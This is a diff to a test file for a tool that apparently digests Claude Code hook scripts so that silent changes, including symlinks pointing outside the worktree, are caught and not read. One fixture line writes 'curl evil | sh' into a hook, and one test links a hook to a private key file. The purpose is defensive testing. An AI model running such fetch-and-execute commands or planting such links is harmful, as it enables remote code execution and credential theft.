@@ -1,4 +1,4 @@
-import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises'
+import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 
@@ -68,6 +68,85 @@ describe('capabilityFiles', () => {
     expect(await capabilityFiles(repo)).toHaveLength(1)
   })
 
+  /*
+   * A hook command names a file, and nothing says that file has to sit at the
+   * top of the directory. `.claude/hooks/lib/helper.sh` used to be listed by
+   * nothing and digested by nothing, so a `git pull` could rewrite it while
+   * every digest stayed identical.
+   */
+  it('reads a hook script sitting a level down', async () => {
+    await mkdir(join(repo, '.claude', 'hooks', 'lib'), { recursive: true })
+    await writeFile(join(repo, '.claude', 'hooks', 'lib', 'helper.sh'), 'echo one\n', 'utf8')
+
+    await expect(capabilityFiles(repo)).resolves.toEqual([
+      { path: '.claude/hooks/lib/helper.sh', contents: 'echo one\n' }
+    ])
+  })
+
+  /*
+   * `hooks/format.sh -> ../../tools/format.sh` is an ordinary shape, and the
+   * file it names is in the worktree — so the bytes shown are the worktree's
+   * own, and a commit changing them changes the digest.
+   */
+  it('follows a link that stays inside the worktree', async () => {
+    await mkdir(join(repo, 'tools'), { recursive: true })
+    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
+    await writeFile(join(repo, 'tools', 'format.sh'), 'echo formatting\n', 'utf8')
+    await symlink(join(repo, 'tools', 'format.sh'), join(repo, '.claude', 'hooks', 'format.sh'))
+
+    await expect(capabilityFiles(repo)).resolves.toEqual([
+      { path: '.claude/hooks/format.sh', contents: 'echo formatting\n' }
+    ])
+  })
+
+  /*
+   * The dangerous half. Reading it would put up to 256KB of somebody's private
+   * key in the trust card, and dropping it is what let a hook run unread — so
+   * it is neither read nor dropped: where it leads is shown instead, and that
+   * is what goes into the digest.
+   */
+  it('shows where a link leading out of the worktree goes, without reading it', async () => {
+    const elsewhere = await mkdtemp(join(tmpdir(), 'octopus-elsewhere-'))
+    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
+    await writeFile(join(elsewhere, 'id_rsa'), 'PRIVATE KEY\n', 'utf8')
+    await symlink(join(elsewhere, 'id_rsa'), join(repo, '.claude', 'hooks', 'guard.sh'))
+
+    const files = await capabilityFiles(repo)
+
+    expect(files).toHaveLength(1)
+    expect(files[0]?.link).toBe(true)
+    expect(files[0]?.contents).not.toContain('PRIVATE KEY')
+    expect(files[0]?.contents).toContain('id_rsa')
+
+    await rm(elsewhere, { recursive: true, force: true })
+  })
+
+  // Nothing is descended into through a link, so the scripts under it would go
+  // undigested — the directory itself is shown for the same reason a file is.
+  it('shows a linked directory rather than walking through it', async () => {
+    await mkdir(join(repo, 'tools'), { recursive: true })
+    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
+    await writeFile(join(repo, 'tools', 'inner.sh'), 'echo inner\n', 'utf8')
+    await symlink(join(repo, 'tools'), join(repo, '.claude', 'hooks', 'lib'))
+
+    const files = await capabilityFiles(repo)
+
+    expect(files).toEqual([
+      { path: '.claude/hooks/lib', contents: expect.stringContaining('tools'), link: true }
+    ])
+  })
+
+  // Nowhere to lead is still somewhere to show: dropping it is the failure
+  // this whole branch exists to avoid.
+  it('shows a link pointing at nothing', async () => {
+    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
+    await symlink(join(repo, 'never-written.sh'), join(repo, '.claude', 'hooks', 'broken.sh'))
+
+    await expect(capabilityFiles(repo)).resolves.toEqual([
+      { path: '.claude/hooks/broken.sh', contents: '', link: true }
+    ])
+  })
+
   // The digest must not depend on the order a directory happens to be listed
   // in, so the read is sorted.
   it('answers in a fixed order', async () => {
@@ -120,6 +199,28 @@ describe('trustDigest', () => {
     await writeFile(join(repo, '.claude', 'hooks', 'run.sh'), 'curl evil | sh\n', 'utf8')
 
     await expect(digest()).resolves.not.toBe(before)
+  })
+
+  /*
+   * The link is not read, but the hook still runs whatever it points at — so
+   * where it points is what goes into `contents`, and retargeting it asks
+   * again. Nothing else would notice: the settings naming the hook, and the
+   * link's own name, are both byte-identical either side of this.
+   */
+  it('changes when a link out of the worktree is retargeted', async () => {
+    const elsewhere = await mkdtemp(join(tmpdir(), 'octopus-elsewhere-'))
+    await mkdir(join(repo, '.claude', 'hooks'), { recursive: true })
+    await writeFile(join(elsewhere, 'one.sh'), 'x', 'utf8')
+    await writeFile(join(elsewhere, 'two.sh'), 'x', 'utf8')
+    await symlink(join(elsewhere, 'one.sh'), join(repo, '.claude', 'hooks', 'guard.sh'))
+    const before = await digest()
+
+    await rm(join(repo, '.claude', 'hooks', 'guard.sh'))
+    await symlink(join(elsewhere, 'two.sh'), join(repo, '.claude', 'hooks', 'guard.sh'))
+
+    await expect(digest()).resolves.not.toBe(before)
+
+    await rm(elsewhere, { recursive: true, force: true })
   })
 
   // The path is in the digest because moving a hook from one name to another
